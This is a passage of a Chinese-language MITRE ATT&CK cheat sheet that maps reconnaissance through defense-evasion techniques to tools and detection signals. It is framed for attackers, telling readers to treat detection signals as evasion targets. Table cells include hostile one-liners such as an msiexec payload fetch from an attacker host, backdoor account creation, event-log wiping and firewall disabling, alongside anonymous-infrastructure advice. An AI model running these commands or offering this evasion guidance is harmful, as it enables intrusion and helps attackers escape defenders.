# MITRE ATT&CK 速查手册

**作者：** Sagar Biswas ([@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT))<br/>
**主仓库：** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
**精选生态：** [Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)<br/>
**许可：** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
**版本：** 1.0.0 · 2027 版<br/>

<div align="right">

**世界级操作者速查：Enterprise + ICS + ATLAS**

</div>

**所属项目：** The BlackHAT Roadmap v0.0.0（从 0 到 GREATEST） | **覆盖框架：** MITRE ATT&CK Enterprise v15、ICS ATT&CK v3、MITRE ATLAS v0.4 | **状态：** 持续更新的文档。投入实战前请到 https://attack.mitre.org 核对编号。

> **如何使用本速查：** 每条技术条目都给出精确的 MITRE 编号、它在路线图中开始变得相关的阶段、一个代表性的工具或实现，以及防守方用来捕获它的主要检测信号。检测列不是警告，而是你的规避目标：先弄清什么会触发告警，再针对性地构建来绕开它。

---

## 目录

1. [企业战术总览](#1-企业战术总览)
2. [TA0043: 侦察](#2-ta0043-侦察)
3. [TA0042: 资源开发](#3-ta0042-资源开发)
4. [TA0001: 初始访问](#4-ta0001-初始访问)
5. [TA0002: 执行](#5-ta0002-执行)
6. [TA0003: 持久化](#6-ta0003-持久化)
7. [TA0004: 提权](#7-ta0004-提权)
8. [TA0005: 防御规避](#8-ta0005-防御规避)
9. [TA0006: 凭据访问](#9-ta0006-凭据访问)
10. [TA0007: 发现](#10-ta0007-发现)
11. [TA0008: 横向移动](#11-ta0008-横向移动)
12. [TA0009: 收集](#12-ta0009-收集)
13. [TA0011: 命令与控制](#13-ta0011-命令与控制)
14. [TA0010: 数据外泄](#14-ta0010-数据外泄)
15. [TA0040: 影响](#15-ta0040-影响)
16. [路线图阶段与技术映射](#16-路线图阶段与技术映射)
17. [关键攻击链图解](#17-关键攻击链图解)
18. [工具与技术映射](#18-工具与技术映射)
19. [MITRE ATLAS: AI/ML 攻击技术](#19-mitre-atlas-aiml-攻击技术)
20. [ICS ATT&CK 速查](#20-ics-attck-速查)
21. [检测信号索引](#21-检测信号索引)

---

<a id="1-enterprise-tactic-overview"></a>
## 1. 企业战术总览

MITRE ATT&CK Enterprise v15 定义了 14 种战术。每种战术回答同一个问题：**攻击者在这个阶段想达成什么？**

>**配套路线图文档：**
> * **[主课程（阶段 -1 至 6）](../phases/PHASE_-1.md)**：从底层金属到顶层作战的零基础到顶尖攻击工程教学大纲。
> * **[BlackHat 长期生存战术](../black-bag/BlackHat_Long-Term_Survival_Tactics.md)**：作战安全、物理反监视与数字身份。
> * **[黑客心态](Philosophy_The_BlackHat_Mindset.md)**：从 Student 到 GREATEST 的认知进阶与研究姿态。
> * **[工具清单](Tools_Inventory.md)**：按阶段对齐的 300+ 工具权威目录，含安装与使用说明。
> * **[实验环境搭建指南](Lab_Setup_Guide.md)**：多层虚拟化、隔离的 AD 实验拓扑与硬件选型。
> * **[资源汇总](Resources_Aggregated.md)**：权威研究数据库、课程、书籍与会议论文集。
> * **[FAQ](FAQ.md)**：运维与职业转型的全面问答。
> * **[最后的话](Final_Word.md)**：文档校验统计、研究者署名与前瞻研究路线图。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/MITRE_ATT&CK_Quick_Reference/1._Enterprise_Tactic_Overview.png" alt="Enterprise Tactic Overview" width="1400"/>

</td></tr></table>
</div>


### 战术索引

| TA# | 战术 | 回答的问题 | 阶段入口 |
|---|---|---|---|
| TA0043 | 侦察 | 在接触目标之前，我能了解到什么？ | 阶段 1+ |
| TA0042 | 资源开发 | 行动前我需要哪些基础设施和工具？ | 阶段 -1 |
| TA0001 | 初始访问 | 我怎样才能在目标环境中取得立足点？ | 阶段 1+ |
| TA0002 | 执行 | 我如何在目标系统上运行自己的代码？ | 阶段 1+ |
| TA0003 | 持久化 | 我如何在重启和防守方清理之后存活下来？ | 阶段 2+ |
| TA0004 | 提权 | 我如何从普通用户变成 SYSTEM/root/域管理员？ | 阶段 2+ |
| TA0005 | 防御规避 | 我如何避免被检测和分析？ | 阶段 3+ |
| TA0006 | 凭据访问 | 我如何窃取凭据以获取进一步访问？ | 阶段 2+ |
| TA0007 | 发现 | 这个网络里有什么，又是如何组织的？ | 阶段 2+ |
| TA0008 | 横向移动 | 我如何从这台机器移动到其他机器？ | 阶段 2+ |
| TA0009 | 收集 | 我如何收集此行的目标数据？ | 阶段 4F+ |
| TA0011 | 命令与控制 | 我如何与植入体保持可靠通信？ | 阶段 4B+ |
| TA0010 | 数据外泄 | 我如何在不触发告警的情况下把数据送出去？ | 阶段 4F+ |
| TA0040 | 影响 | 我如何达成最终目标（勒索、破坏、瘫痪）？ | 阶段 4F+ |

---

<a id="2-ta0043-reconnaissance"></a>
## 2. TA0043: 侦察

> 攻击前的信息收集。没有任何恶意代码接触目标。所有被动与主动侦察都归在这里。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 主动扫描 | 扫描 IP 段 | T1595.001 | nmap、masscan、shodan-cli | 防火墙：来自单一来源的顺序端口扫描模式 |
| 主动扫描 | 漏洞扫描 | T1595.002 | nuclei、nessus、OpenVAS | WAF/IDS：已知扫描器的 User-Agent 与探测特征 |
| 主动扫描 | 字典扫描 | T1595.003 | ffuf、gobuster、feroxbuster | Web 服务器：404 突增、目录扫描特征 |
| 收集受害者主机信息 | 软件 | T1592.002 | shodan、Censys、BinaryEdge | 内部不可见：仅被动 OSINT |
| 收集受害者网络信息 | 网络拓扑 | T1590.004 | BGP 路由数据、WHOIS、traceroute | 内部不可见 |
| 收集受害者网络信息 | DNS | T1590.002 | dig、dnsx、subfinder、amass | 内部不可见 |
| 收集受害者身份信息 | 电子邮件地址 | T1589.002 | hunter.io、theHarvester、phonebook.cz | 内部不可见 |
| 收集受害者身份信息 | 凭据 | T1589.001 | dehashed.com、泄漏数据库、HIBP | 内部不可见 |
| 收集受害者组织信息 | 确定物理位置 | T1591.001 | LinkedIn、Google Maps、企业官网 | 内部不可见 |
| 收集受害者组织信息 | 识别业务节奏 | T1591.003 | LinkedIn、Glassdoor、财报电话会 | 内部不可见 |
| 搜索开放技术数据库 | WHOIS / RDAP | T1596.001 | whois、viewdns.info | 内部不可见 |
| 搜索开放技术数据库 | Shodan / Censys | T1596.005 | shodan CLI、Censys API | 内部不可见 |
| 搜索开放技术数据库 | 证书透明度 | T1596.003 | crt.sh、certstream | 内部不可见 |
| 搜索开放网站 | 社交媒体 | T1593.001 | LinkedIn、Twitter/X、GitHub dorking | 内部不可见 |
| 搜索开放网站 | 代码仓库 | T1593.003 | GitHub、GitLab：truffleHog、gitleaks | 内部不可见 |
| 搜索封闭来源 | 威胁情报 | T1597.001 | 暗网论坛、付费情报源 | 内部不可见 |
| 信息钓鱼 | 鱼叉钓鱼链接 | T1598.003 | 跟踪像素、O365 授权钓鱼 | 邮件网关：可疑链接重写 |
| 信息钓鱼 | 鱼叉钓鱼附件 | T1598.002 | 带跟踪信标的宏文档 | 邮件网关：启用宏的文档 |

---

<a id="3-ta0042-resource-development"></a>
## 3. TA0042: 资源开发

> 在行动前构建和获取所需的基础设施与能力。对应阶段 -1 的作战安全工作。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 获取基础设施 | 域名 | T1583.001 | Namecheap + 加密货币、老域名经纪 | 被动 DNS：近期注册且与目标相似的域名 |
| 获取基础设施 | DNS 服务器 | T1583.002 | VPS 上自建 NS（dnsmasq、bind9） | 行动前外部不可见 |
| 获取基础设施 | 虚拟专用服务器 | T1583.003 | 用门罗币支付 Vultr/Hetzner | 行动前外部不可见 |
| 获取基础设施 | 服务器 | T1583.004 | 独立服务器、防弹主机 | 行动前外部不可见 |
| 获取基础设施 | Web 服务 | T1583.006 | GitHub Pages、Azure Blob、S3（用于暂存） | 行动前外部不可见 |
| 攻陷基础设施 | 服务器 | T1584.004 | 攻陷合法服务器用作中继 | 行动前外部不可见 |
| 开发能力 | 恶意软件 | T1587.001 | 自研 C2 植入体、自研投放器 | 行动前外部不可见 |
| 开发能力 | 代码签名证书 | T1587.002 | 以空壳公司名义购买 EV 证书 | 行动前外部不可见 |
| 开发能力 | 漏洞利用 | T1587.004 | 模糊测试、补丁对比、POC 开发 | 行动前外部不可见 |
| 获取能力 | 恶意软件 | T1588.001 | GitHub、地下市场 | 行动前外部不可见 |
| 获取能力 | 工具 | T1588.002 | Cobalt Strike 授权、商业 RAT | 行动前外部不可见 |
| 获取能力 | 漏洞 | T1588.006 | 购买 0day、漏洞赏金情报 | 行动前外部不可见 |
| 准备能力 | 上传恶意软件 | T1608.001 | 将载荷上传到暂存服务器 | 行动前外部不可见 |
| 准备能力 | SEO 投毒 | T1608.006 | 恶意广告、操纵搜索结果 | 行动前外部不可见 |

---

<a id="4-ta0001-initial-access"></a>
## 4. TA0001: 初始访问

> 攻击者如何取得第一个立足点。Web 方向从阶段 1+ 开始，网络与社会工程方向从阶段 2+ 开始。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 钓鱼 | 鱼叉钓鱼附件 | T1566.001 | 启用宏的 Office 文档、ISO 投放器 | 邮件网关：宏文档、ISO/IMG 附件。Defender：AMSI 扫描宏 |
| 钓鱼 | 鱼叉钓鱼链接 | T1566.002 | Evilginx3 AiTM、O365 设备码钓鱼 | 邮件网关：URL 沙箱引爆。浏览器：证书不匹配 |
| 钓鱼 | 通过服务进行鱼叉钓鱼 | T1566.003 | Teams/Slack 钓鱼私信、LinkedIn 消息 | CASB/DLP：带外部链接和文件的消息 |
| 利用面向公众的应用程序 | -- | T1190 | 面向互联网应用上的 SQLi、RCE（Burp、nuclei） | WAF 告警，SIEM：Web 日志中的漏洞利用特征 |
| 外部远程服务 | -- | T1133 | VPN 凭据填充、RDP 暴力破解 | SIEM：反复认证失败、地理位置异常 |
| 有效账户 | 域账户 | T1078.002 | 撞库、钓鱼所得凭据用于 VPN | UEBA：不可能旅行、非工作时间登录异常 |
| 有效账户 | 云账户 | T1078.004 | Azure/AWS/GCP 凭据窃取 | CASB：不可能旅行、新设备加新 IP |
| 供应链攻击 | 攻陷软件依赖 | T1195.001 | 恶意 NPM/PyPI 包、仿冒包名 | 依赖扫描：哈希不匹配、维护者变更 |
| 供应链攻击 | 攻陷软件供应链 | T1195.002 | 被植入后门的更新服务器、CI/CD 流水线 | 代码签名：证书无效或不符合预期 |
| 硬件添加 | -- | T1200 | LAN Turtle、Bash Bunny、Rubber Ducky | 物理：USB 设备日志（事件 6416），终端：未知 USB |
| 通过可移动介质复制 | -- | T1091 | autorun.inf、USB 上的快捷方式（.lnk）投放器 | 终端：autorun 已禁用、USB 设备策略 |
| 信任关系 | -- | T1199 | 攻陷拥有访问权限的 MSP 或 IT 供应商 | SIEM：变更窗口之外来自第三方 CIDR 的访问 |
| 路过式入侵 | -- | T1189 | 通过水坑攻击的浏览器漏洞利用 | 浏览器遥测：漏洞利用工具包特征、脚本注入 |

---

<a id="5-ta0002-execution"></a>
## 5. TA0002: 执行

> 在目标系统上运行由攻击者控制的代码。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 命令和脚本解释器 | PowerShell | T1059.001 | Invoke-Expression、AMSI 绕过 + 下载 cradle | 事件 4104：脚本块日志。Defender：AMSI 扫描 |
| 命令和脚本解释器 | Windows 命令行 | T1059.003 | cmd.exe LOLBin 链、wscript.exe | 事件 4688：可疑的 cmd.exe 父进程（Office、浏览器） |
| 命令和脚本解释器 | Unix Shell | T1059.004 | bash -c、sh 反弹 shell 一行命令 | auditd：参数可疑的 execve、/proc 监控 |
| 命令和脚本解释器 | Python | T1059.006 | python3 -c 载荷、pty.spawn 起 shell | auditd：python3 拉起 sh/bash |
| 命令和脚本解释器 | JavaScript | T1059.007 | wscript.exe 执行恶意 .js、Node.js 载荷 | 事件 4688：带 .js 参数的 wscript.exe |
| 命令和脚本解释器 | Visual Basic | T1059.005 | mshta.exe 执行 vbscript、wscript 执行 .vbs | 事件 4688：mshta.exe、cscript.exe 的异常父进程 |
| 原生 API | -- | T1106 | 直接系统调用（SysWhispers3、FreshyCalls）、NtCreateProcess | ETW：NtApi 调用序列异常。EDR：脱钩检测 |
| 计划任务/作业 | 计划任务 | T1053.005 | schtasks /create、BITS 作业、任务计划程序 COM | 事件 4698：任务被创建。Sysmon 1：带 /create 的 schtasks.exe |
| 计划任务/作业 | Cron | T1053.003 | crontab -e、/etc/cron.d/ 投放器 | auditd：crontab 写入。文件完整性：/etc/cron* 被修改 |
| 计划任务/作业 | 容器编排作业 | T1053.007 | 用 Kubernetes CronJob 实现持久化 | K8s 审计日志：由异常服务账号创建的 CronJob |
| Windows 管理规范 | -- | T1047 | wmic process call create、WMI 事件订阅 | 事件 4688：wmiprvse.exe 子进程。Sysmon：WMI 拉起异常进程 |
| 系统服务 | 服务执行 | T1569.002 | sc.exe create/start、psexec 远程服务 | 事件 7045：新服务被安装。事件 4624 登录类型 3 |
| 用户执行 | 恶意文件 | T1204.002 | 武器化 Office 文档、.lnk 投放器、ISO 容器 | Defender：打开即扫描文件。Sysmon 11：Office 拉起脚本 |
| 用户执行 | 恶意链接 | T1204.001 | 浏览器漏洞利用、伪造更新页面 | 网络：DNS 解析到已知恶意域名。浏览器：脚本执行 |
| 软件部署工具 | -- | T1072 | 滥用 SCCM/Intune、Ansible 推送载荷 | SCCM 日志：向非计划集合部署 |
| 利用客户端执行 | -- | T1203 | 浏览器漏洞利用（CVE）、PDF 漏洞利用 | AV/EDR：渲染进程内存中的 shellcode |
| 共享模块 | -- | T1129 | 通过 LoadLibrary 从异常路径加载 DLL | Sysmon 7：从可写路径（AppData、Temp）加载镜像 |

---

<a id="6-ta0003-persistence"></a>
## 6. TA0003: 持久化

> 在重启、凭据变更和防守方清理之后仍能存活。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 启动或登录自启动执行 | 注册表 Run 键 | T1547.001 | HKCU\Software\Microsoft\Windows\CurrentVersion\Run | Sysmon 12/13：异常进程写入 Run 键 |
| 启动或登录自启动执行 | Winlogon 辅助 DLL | T1547.004 | 修改 Winlogon\Userinit 或 Shell 值 | Sysmon 13：Winlogon 注册表值被修改 |
| 启动或登录自启动执行 | 安全支持提供程序 | T1547.005 | 向 LSA\Security Packages 注册表添加（自定义 SSP） | Sysmon 13：LSA Security Packages 被写入。Sysmon 7：lsass 加载新的 SSP DLL |
| 启动或登录自启动执行 | 快捷方式修改 | T1547.009 | 启动文件夹中指向恶意目标的 LNK 文件 | Sysmon 11：启动路径下 .lnk 文件被创建/修改 |
| 启动或登录自启动执行 | 内核模块与扩展 | T1547.006 | LKM rootkit（Linux）、kext（macOS 旧版） | auditd：init_module 系统调用。modprobe 日志：未签名模块 |
| 启动或登录初始化脚本 | 登录脚本（Windows） | T1037.001 | 组策略登录脚本、UserInitMprLogonScript | 事件 4688：登录时从 SYSVOL 运行脚本 |
| 创建或修改系统进程 | Windows 服务 | T1543.003 | sc.exe create、服务 DLL、BYOVD 驱动加载 | 事件 7045：新服务。Sysmon 6：从临时路径加载驱动 |
| 创建或修改系统进程 | 启动代理（macOS） | T1543.001 | ~/Library/LaunchAgents/ plist | launchd 日志：新代理被加载。文件完整性：LaunchAgents/ |
| 创建或修改系统进程 | 启动守护进程（macOS） | T1543.004 | /Library/LaunchDaemons/ 中 root 所有的 plist | launchd 日志：新守护进程。文件完整性：LaunchDaemons/ |
| 计划任务/作业 | 计划任务 | T1053.005 | schtasks、任务计划程序 COM 对象 | 事件 4698、4702：任务被创建/更新 |
| 计划任务/作业 | Cron | T1053.003 | crontab、/etc/cron.d、/etc/cron.hourly | 文件完整性：cron 路径被修改 |
| 事件触发执行 | WMI 事件订阅 | T1546.003 | __EventFilter + __EventConsumer + __FilterToConsumerBinding | 事件 5861：WMI 活动。Sysmon 19/20/21：WMI 事件 |
| 事件触发执行 | 组件对象模型劫持 | T1546.015 | HKCU\Software\Classes\CLSID 注册表劫持 | Sysmon 12/13：HKCU 下 CLSID 被写入。Sysmon 7：从异常路径加载 COM DLL |
| 事件触发执行 | 应用程序兼容性填充 | T1546.011 | sdbinst.exe 自定义 shim 数据库 | 事件 4688：sdbinst.exe。Sysmon：shim 数据库文件 |
| 劫持执行流 | DLL 搜索顺序劫持 | T1574.001 | 将恶意 DLL 放入应用程序目录（幻影 DLL） | Sysmon 7：DLL 从应用目录而非 System32 加载 |
| 劫持执行流 | DLL 侧加载 | T1574.002 | 合法签名二进制并排加载未签名 DLL | Sysmon 7：与已签名 EXE 并排加载的无签名 DLL |
| 劫持执行流 | 路径拦截（PATH 环境变量） | T1574.007 | 把可写目录前置到 PATH，遮蔽系统二进制 | auditd：系统二进制的 execve 解析到用户可写路径 |
| 操作系统启动前 | 系统固件 | T1542.001 | UEFI DXE 驱动植入（CosmicStrand、MoonBounce） | 固件完整性校验失败。安全启动：签名不匹配 |
| 操作系统启动前 | 引导套件 | T1542.003 | MBR/VBR 覆写（旧式）、UEFI bootkit（现代） | 安全启动：策略违规。BitLocker：意外恢复提示 |
| 服务器软件组件 | Web Shell | T1505.003 | China Chopper、WSO、aspx/php Web Shell | Web 服务器日志：向 .aspx/.php 发送带 cmd/eval 特征的 POST |
| 创建账户 | 本地账户 | T1136.001 | net user backdoor /add、useradd -m | 事件 4720：用户账户被创建。auditd：useradd |
| 创建账户 | 域账户 | T1136.002 | New-ADUser（需要域管理员权限） | DC 上的事件 4720：域账户创建 |
| 浏览器扩展 | -- | T1176 | 通过策略下发恶意 Chrome/Edge 扩展 | 浏览器管理日志：应用商店之外安装的扩展 |
| BITS 作业 | -- | T1197 | bitsadmin /create、Start-BitsTransfer（下载并执行） | 事件 4688：bitsadmin.exe。BITS 日志：指向外部 URL 的作业 |

---

<a id="7-ta0004-privilege-escalation"></a>
## 7. TA0004: 提权

> 从低权限用户升到 SYSTEM（Windows）、root（Linux）或域管理员（AD）。

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 滥用提权控制机制 | 绕过用户账户控制 | T1548.002 | fodhelper.exe、eventvwr.exe、sdclt.exe、UACME | 事件 4688：中完整性父进程在无 UAC 提示下拉起高完整性进程 |
| 滥用提权控制机制 | Setuid 与 Setgid | T1548.001 | 滥用 SUID 二进制：find / -perm -4000、GTFOBins | auditd：非属主执行 SUID 二进制。Linux 版 Sysmon：setuid 调用 |
| 滥用提权控制机制 | Sudo 与 Sudo 缓存 | T1548.003 | sudo -l、滥用 sudo、sudoers 配置错误 | auth.log：sudo 调用。auditd：sudo 命令 |
| 滥用提权控制机制 | TCC 操纵（macOS） | T1548.006 | 修改 TCC.db、滥用 entitlement | macOS 统一日志：TCC 授权绕过事件 |
| 访问令牌操纵 | 令牌模拟/窃取 | T1134.001 | Incognito、ImpersonateLoggedOnUser、滥用 SeImpersonatePrivilege | 事件 4624 登录类型 9：在模拟令牌下用显式凭据登录 |
| 访问令牌操纵 | 使用令牌创建进程 | T1134.002 | CreateProcessWithTokenW、runas /netonly | 事件 4688：以另一账户令牌创建进程 |
| 访问令牌操纵 | 创建并模拟令牌 | T1134.003 | LogonUser + ImpersonateLoggedOnUser | 事件 4648：显式凭据登录 |
| 利用漏洞提权 | -- | T1068 | HEVD 内核漏洞、CVE 本地提权、BYOVD（利用阶段） | 尝试失败导致内核崩溃（BSOD）。EDR：内核上下文中的 shellcode |
| 进程注入 | DLL 注入 | T1055.001 | CreateRemoteThread + LoadLibrary 模式 | Sysmon 8：CreateRemoteThread。Sysmon 10：对目标 OpenProcess |
| 进程注入 | 可移植可执行文件注入 | T1055.002 | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | Sysmon 8：向无关进程发起 CreateRemoteThread |
| 进程注入 | 线程执行劫持 | T1055.003 | SuspendThread + GetThreadContext + SetThreadContext | Sysmon 8：线程操纵。EDR：线程上下文被修改 |
| 进程注入 | 异步过程调用 | T1055.004 | QueueUserAPC、Early Bird APC 注入 | Sysmon 8：向可警告线程 QueueUserAPC。内存：APC 队列中的 shellcode |
| 进程注入 | 进程镂空 | T1055.012 | CREATE_SUSPENDED + NtUnmapViewOfSection + 写入 + 恢复 | Sysmon 25：进程篡改（镜像不匹配）。EDR：VAD 遍历发现被镂空的节 |
| 进程注入 | 进程分身（Doppelganging） | T1055.013 | TxF 事务 + 创建节 + 创建进程 | EDR：NtCreateTransaction + NtCreateSection 序列 |
| 进程注入 | Ptrace 系统调用（Linux） | T1055.008 | 对目标进程 ptrace(PTRACE_POKETEXT) | auditd：对非子进程的 ptrace 系统调用 |
| 创建或修改系统进程 | Windows 服务 | T1543.003 | 未加引号的服务路径、可写的服务二进制 | 事件 7045：新服务。SCM 审计 |
| 逃逸至宿主机 | -- | T1611 | 特权 Docker 容器、挂载 docker.sock、CAP_SYS_ADMIN | 容器运行时：privileged 标志。K8s 审计：带 hostPID/hostNetwork 的容器 |

---

<a id="8-ta0005-defense-evasion"></a>
## 8. TA0005: 防御规避

> 最大的战术。这里的每一项技术都是为了防止被检测、分析或响应。阶段 4C 的核心内容。

### 8.1 混淆与内存内技术

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 混淆文件或信息 | 二进制填充 | T1027.001 | 追加空字节以改变哈希 | 基于哈希的检测失效。文件大小异常 |
| 混淆文件或信息 | 软件加壳 | T1027.002 | UPX、自研壳、PE 节区加密 | 熵扫描：PE 节区高熵。基于模拟执行的检测 |
| 混淆文件或信息 | 隐写术 | T1027.003 | 载荷隐藏在 PNG/JPEG/WAV 中 | 内容检查（少见）。DLP：外发图片含异常数据 |
| 混淆文件或信息 | 投递后编译 | T1027.004 | 投递 C# 源码并在目标上用 csc.exe 编译 | Sysmon 1：异常父进程拉起 csc.exe、msbuild.exe |
| 混淆文件或信息 | 动态 API 解析 | T1027.007 | 运行时用 GetProcAddress 而非导入表、基于哈希的 API 解析 | EDR：已解析函数的导入表条目缺失。静态分析失效 |
| 混淆文件或信息 | 剥离载荷 | T1027.008 | 剥离符号、移除 RTTI、移除调试信息 | 逆向难度上升。文件：无 PDB 路径、无版本信息 |
| 混淆文件或信息 | 嵌入载荷 | T1027.009 | 将 shellcode 嵌入 PNG 资源、PE 覆盖区 | 熵扫描：资源节区高熵 |
| 混淆文件或信息 | 命令混淆 | T1027.010 | Invoke-Obfuscation、PowerShell 分词器绕过、base64 编码 | AMSI：混淆模式启发式。脚本块日志 |
| 混淆文件或信息 | 加密/编码文件 | T1027.013 | AES 加密的 shellcode、XOR 编码的载荷 | 静态：无字符串。动态：内存中的解密+执行模式 |
| 混淆文件或信息 | 休眠混淆 | T1027 | Ekko、Foliage、Cronos：休眠期间在内存中加密植入体 | EDR：休眠时内存扫描发现加密块而非 shellcode。时序异常 |
| 反射式代码加载 | -- | T1620 | sRDI（shellcode 反射式 DLL 注入）、Donut、反射式 PE 加载 | EDR：PE 被映射但磁盘上无对应文件。Sysmon 7：无磁盘后备的 DLL |

> **修正说明（对比上一版）：** “Reflective DLL Injection” 此前被列为 T1055.001。T1055.001 是 **DLL 注入**（CreateRemoteThread + LoadLibrary 模式）。反射式 DLL 加载——即 DLL 不调用 LoadLibrary，而是把自己加载进内存——对应 **T1620**（反射式代码加载）。sRDI（shellcode 反射式 DLL 注入）对应 T1620，而不是 T1055.001。

### 8.2 系统与进程规避

| 技术 | 子技术 | ID | 工具 / 方法 | 检测信号 |
|---|---|---|---|---|
| 削弱防御 | 禁用或修改工具（AMSI 绕过） | T1562.001 | 内存中修补 AmsiScanBuffer、注销 AMSI 提供程序 | Sysmon 10：对 AV/EDR 进程 OpenProcess。AMSI：提供程序未加载 |
| 削弱防御 | 禁用 Windows 事件日志 | T1562.002 | wevtutil sl Security /e:false、NtSetSystemInformation | 事件 1100/1102：日志服务停止/清空。事件时间线出现空档 |
| 削弱防御 | 削弱命令历史记录 | T1562.003 | unset HISTFILE、Set-PSReadLineOption -HistorySaveStyle SaveNothing | 取证：.bash_history 缺失、PSReadLine 历史为空 |
| 削弱防御 | 禁用或修改防火墙 | T1562.004 | netsh advfirewall set allprofiles state off | 事件 4950：防火墙策略被更改 |
| 削弱防御 | 指示器阻断（ETW 补丁） | T1562.006 | 修补 ntdll.dll 中的 EtwEventWrite（把函数改成 NOP） | EDR：遥测静默空档。内存：检测到 ntdll.dll 被修改 |
| 削弱防御 | 降级攻击 | T1562.010 | PSv2 降级（绕过脚本块日志）、TLS 降级 | 事件 400：PowerShell 引擎版本为 2。网络：异常的老旧协议 |
| BYOVD——驱动加载阶段 | Windows 服务 | T1543.003 | LOLDrivers：通过 sc.exe 加载 gmer.sys、RTCore64.sys、DBUtil_2_3.sys | 事件 7045：服务被安装。Sysmon 6：从非标准路径加载驱动 |
| BYOVD——EDR 终止阶段 | 禁用或修改工具 | T1562.001 | 用有漏洞的驱动 IOCTL 终止 EDR 进程或驱动 | EDR：自我保护告警。内核：受保护进程被驱动级意外终止 |
| 虚拟化/沙箱规避 | 系统检查 | T1497.001 | 检查 CPU 核心数、内存大小、磁盘大小、CPUID hypervisor 位 | 行为：在沙箱中延迟或空转。沙箱：载荷执行前进程异常退出 |
| 虚拟化/沙箱规避 | 基于用户活动的检查 | T1497.002 | 检查鼠标移动历史、前台窗口、最近文件 | 沙箱：无用户活动模拟即触发载荷 |
| 虚拟化/沙箱规避 | 基于时间的规避 | T1497.003 | 执行前休眠 5 分钟以上、检查系统运行时长 | 沙箱：超时，引爆尚未完成 |
| 隐藏痕迹 | 隐藏文件和目录 | T1564.001 | attrib +h +s、chflags hidden（macOS）、点号前缀（Linux） | 文件完整性：敏感路径下出现隐藏文件 |
| 隐藏痕迹 | 隐藏用户 | T1564.002 | HKLM\...\Winlogon\SpecialAccounts\UserList 注册表项 | 事件 4720 + 注册表项。用户列表异常 |
| 隐藏痕迹 | 隐藏窗口 | T1564.003 | 带 SW_HIDE 的 CreateWindowEx、PowerShell -WindowStyle Hidden | Sysmon 1：带 -WindowStyle Hidden 参数的进程 |
| 隐藏痕迹 | 隐藏文件系统 | T1564.005 | 向未分区空间原始写盘、备用数据流 | 取证：ADS 扫描（streams.exe）、磁盘十六进制分析 |
| 隐藏痕迹 | 运行虚拟实例 | T1564.006 | 在 VM 中运行恶意软件以躲过宿主机 EDR | 虚拟机监控程序检测：终端上安装了异常的 vmware/virtualbox 驱动 |
| 伪装 | 匹配合法名称/位置 | T1036.005 | %APPDATA% 下的 svchost.exe、不在 System32 的 lsass.exe | Sysmon 1：进程路径与预期位置不符 |
| 伪装 | 双文件扩展名 | T1036.007 | resume.pdf.exe、invoice.docx.js | 文件：邮件网关或终端出现双扩展名 |
| 系统二进制代理执行 | Rundll32 | T1218.011 | rundll32.exe payload.dll,EntryPoint | Sysmon 1：rundll32.exe 使用异常 DLL 路径或逗号语法 |
| 系统二进制代理执行 | Regsvr32 | T1218.010 | regsvr32 /s /u /i:http://... scrobj.dll（Squiblydoo） | Sysmon 1：带 /i: URL 参数的 regsvr32.exe |
| 系统二进制代理执行 | Mshta | T1218.002 | mshta.exe vbscript:payload、mshta http://... | Sysmon 1：带 URL 或 vbscript: 参数的 mshta.exe |
| 系统二进制代理执行 | Msiexec | T1218.007 | msiexec /q /i http://attacker/payload.msi | Sysmon 1：带 /i URL 的 msiexec.exe。网络：msiexec 走 HTTP |
| 系统二进制代理执行 | InstallUtil | T1218.004 | InstallUtil.exe /logfile= /U payload.exe | Sysmon 1：出现在异常上下文中的 InstallUtil.exe |
| 系统二进制代理执行 | MSBuild | T1127.001 | msbuild.exe 执行恶意 .csproj | Sysmon 1：不在 Visual Studio 上下文中的 msbuild.exe |
| 系统二进制代理执行 | Verclsid | T1218.012 | verclsid.exe /S /C {CLSID} 执行 COM 对象 | Sysmon 1：带异常 CLSID 的 verclsid.exe |
| 删除指示器 | 清除 Windows 事件日志 | T1070.001 | wevtutil cl System、Clear-EventLog | 事件 1102：安全日志被清空。事件 104：系统日志被清空 |
| 删除指示器 | 清除命令历史 | T1070.003 | Remove-Item (Get-PSReadLineOption).HistorySavePath | 取证：PSReadLine 历史文件为空或缺失 |
| 删除指示器 | 删除文件 | T1070.004 | del /f /q、rm -rf、secure-delete | 取证：MFT 有条目但文件不存在。USN 日志：删除记录 |
| 删除指示器 | 时间戳篡改 | T1070.006 | touch -t、SetFileTime Win32 API | 取证：MFT 中 $STANDARD_INFORMATION 与 $FILE_NAME 不一致 |
| 反混淆/解码文件或信息 | -- | T1140 | certutil -decode、base64 -d、目标上的 XOR 解码例程 | Sysmon 1：带 -decode 的 certutil.exe。脚本：解码+执行模式 |
| 修改注册表 | -- | T1112 | reg add、RegSetValueEx、直接写注册表配置单元 | Sysmon 12/13：敏感键的注册表修改 |
| 间接命令执行 | -- | T1202 | pcalua.exe、forfiles、explorer.exe shell: | Sysmon 1：经 LOLBin 形成的异常父子进程链 |
| 栈伪造 | -- | T1027 | 合成调用栈（ThreadStackSpoofer、CallStackSpoofer）：伪造 RET 链以隐藏真实调用来源 | EDR：调用栈回溯终止于非标准模块。内核态栈回溯发现伪造帧 |

